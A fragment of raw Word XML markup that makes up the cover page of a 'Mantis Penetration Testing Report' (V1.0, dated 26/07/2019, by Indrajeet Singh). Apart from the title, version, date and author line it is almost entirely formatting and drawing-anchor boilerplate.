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2D1253" w:rsidRPr="00802CE3" w:rsidRDefault="000122C4">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="300"/>
        </w:tabs>
        <w:ind w:right="1420"/>
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251640320" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="page">
              <wp:posOffset>6361430</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="page">
              <wp:posOffset>457200</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="13970" cy="179070"/>
            <wp:effectExtent l="0" t="0" r="5080" b="0"/>
            <wp:wrapNone/>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70" cy="179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802CE3">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251639296" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="page">
              <wp:posOffset>0</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="page">
              <wp:posOffset>0</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5715" cy="179070"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:wrapSquare wrapText="bothSides"/>
            <wp:docPr id="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 cy="17907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802CE3">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251641344" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="page">
              <wp:posOffset>0</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="page">
              <wp:posOffset>0</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5715" cy="179070"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:wrapSquare wrapText="bothSides"/>
            <wp:docPr id="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 cy="17907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802CE3">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251643392" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="page">
              <wp:posOffset>0</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="page">
              <wp:posOffset>0</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="4445" cy="4445"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:wrapSquare wrapText="bothSides"/>
            <wp:docPr id="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5" cy="444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802CE3">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251645440" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="page">
              <wp:posOffset>0</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="page">
              <wp:posOffset>0</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5715" cy="179070"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:wrapSquare wrapText="bothSides"/>
            <wp:docPr id="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 cy="17907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802CE3">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251647488" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="page">
              <wp:posOffset>0</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="page">
              <wp:posOffset>0</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5715" cy="179070"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:wrapSquare wrapText="bothSides"/>
            <wp:docPr id="1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 cy="17907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802CE3">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251649536" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="page">
              <wp:posOffset>0</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="page">
              <wp:posOffset>0</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5715" cy="179070"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:wrapSquare wrapText="bothSides"/>
            <wp:docPr id="1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 cy="17907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802CE3">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251651584" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="page">
              <wp:posOffset>0</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="page">
              <wp:posOffset>0</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5715" cy="179070"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:wrapSquare wrapText="bothSides"/>
            <wp:docPr id="1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 cy="17907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802CE3">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251653632" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="page">
              <wp:posOffset>0</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="page">
              <wp:posOffset>0</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5715" cy="179070"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:wrapSquare wrapText="bothSides"/>
            <wp:docPr id="1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 cy="17907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802CE3">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251654656" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="page">
              <wp:posOffset>0</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="page">
              <wp:posOffset>0</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5715" cy="179070"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:wrapSquare wrapText="bothSides"/>
            <wp:docPr id="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 cy="17907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802CE3">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251656704" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="page">
              <wp:posOffset>0</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="page">
              <wp:posOffset>0</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5715" cy="179070"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:wrapSquare wrapText="bothSides"/>
            <wp:docPr id="1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 cy="17907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802CE3">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251658752" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="page">
              <wp:posOffset>0</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="page">
              <wp:posOffset>0</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5715" cy="179070"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:wrapSquare wrapText="bothSides"/>
            <wp:docPr id="2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 cy="17907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802CE3">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251660800" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="page">
              <wp:posOffset>0</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="page">
              <wp:posOffset>0</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5715" cy="179070"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:wrapSquare wrapText="bothSides"/>
            <wp:docPr id="2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 cy="17907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802CE3">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251662848" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="page">
              <wp:posOffset>0</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="page">
              <wp:posOffset>0</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5715" cy="179070"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:wrapSquare wrapText="bothSides"/>
            <wp:docPr id="2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 cy="17907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802CE3">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251664896" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="page">
              <wp:posOffset>0</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="page">
              <wp:posOffset>0</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5715" cy="179070"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:wrapSquare wrapText="bothSides"/>
            <wp:docPr id="2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 cy="17907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802CE3">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251668992" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="page">
              <wp:posOffset>0</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="page">
              <wp:posOffset>0</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5715" cy="179070"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:wrapSquare wrapText="bothSides"/>
            <wp:docPr id="3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 cy="17907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802CE3">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251671040" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="page">
              <wp:posOffset>0</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="page">
              <wp:posOffset>0</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5715" cy="179070"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:wrapSquare wrapText="bothSides"/>
            <wp:docPr id="3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 cy="17907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802CE3">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251673088" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="page">
              <wp:posOffset>0</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="page">
              <wp:posOffset>0</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5715" cy="179070"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:wrapSquare wrapText="bothSides"/>
            <wp:docPr id="3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 cy="17907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802CE3">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251675136" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="page">
              <wp:posOffset>0</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="page">
              <wp:posOffset>0</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5715" cy="179070"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:wrapSquare wrapText="bothSides"/>
            <wp:docPr id="3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 cy="179070"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:effectLst/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
            <wp14:sizeRelH relativeFrom="page">
              <wp14:pctWidth>0</wp14:pctWidth>
            </wp14:sizeRelH>
            <wp14:sizeRelV relativeFrom="page">
              <wp14:pctHeight>0</wp14:pctHeight>
            </wp14:sizeRelV>
          </wp:anchor>
        </w:drawing>
      </w:r>
      <w:bookmarkStart w:id="0" w:name="page17"/>
      <w:bookmarkEnd w:id="0"/>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="00D003DD">
      <w:pPr>
        <w:ind w:left="1440"/>
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="96"/>
          <w:szCs w:val="96"/>
        </w:rPr>
        <w:t>Mantis</w:t>
      </w:r>
      <w:r w:rsidR="0029303A" w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="96"/>
          <w:szCs w:val="96"/>
        </w:rPr>
        <w:t xml:space="preserve"> Penetration Testing Report</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
      <w:pPr>
        <w:spacing w:line="20" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="0029303A">
      <w:pPr>
        <w:ind w:left="4320"/>
        <w:rPr>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:sz w:val="96"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t xml:space="preserve"> V1.0</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
      <w:pPr>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
      <w:pPr>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="0029303A">
      <w:pPr>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t xml:space="preserve">     Assessment </w:t>
      </w:r>
      <w:r w:rsidR="005F0D98" w:rsidRPr="00802CE3">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>Date:</w:t>
      </w:r>
      <w:r w:rsidR="00D003DD">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t xml:space="preserve"> 26/07/2019</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
      <w:pPr>
        <w:spacing w:line="217" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00B318AA" w:rsidRPr="00802CE3" w:rsidRDefault="00B318AA">
      <w:pPr>
        <w:spacing w:line="217" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00B318AA" w:rsidRPr="00802CE3" w:rsidRDefault="00B318AA">
      <w:pPr>
        <w:spacing w:line="217" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00B318AA" w:rsidRPr="00802CE3" w:rsidRDefault="00B318AA">
      <w:pPr>
        <w:spacing w:line="217" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00B318AA" w:rsidRPr="00802CE3" w:rsidRDefault="00B318AA">
      <w:pPr>
        <w:spacing w:line="217" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00B318AA" w:rsidRPr="00802CE3" w:rsidRDefault="00B318AA">
      <w:pPr>
        <w:spacing w:line="217" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="0029303A">
      <w:pPr>
        <w:ind w:left="7740"/>
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:sectPr w:rsidR="002D1253" w:rsidRPr="00802CE3">
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="739" w:right="360" w:bottom="0" w:left="360" w:header="720" w:footer="720" w:gutter="0"/>
          <w:cols w:space="720"/>
          <w:docGrid w:linePitch="240" w:charSpace="-2049"/>
        </w:sectPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>By: Indrajeet Singh</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
      <w:pPr>
        <w:sectPr w:rsidR="002D1253" w:rsidRPr="00802CE3">
          <w:type w:val="continuous"/>
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="739" w:right="360" w:bottom="0" w:left="360" w:header="720" w:footer="720" w:gutter="0"/>
          <w:cols w:num="3" w:space="720" w:equalWidth="0">
            <w:col w:w="5320" w:space="440"/>
            <w:col w:w="3598" w:space="720"/>
            <w:col w:w="1441"/>
          </w:cols>
          <w:docGrid w:linePitch="240" w:charSpace="-2049"/>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="000122C4" w:rsidP="005F0D98">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="420"/>
        </w:tabs>
        <w:ind w:right="1420"/>
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
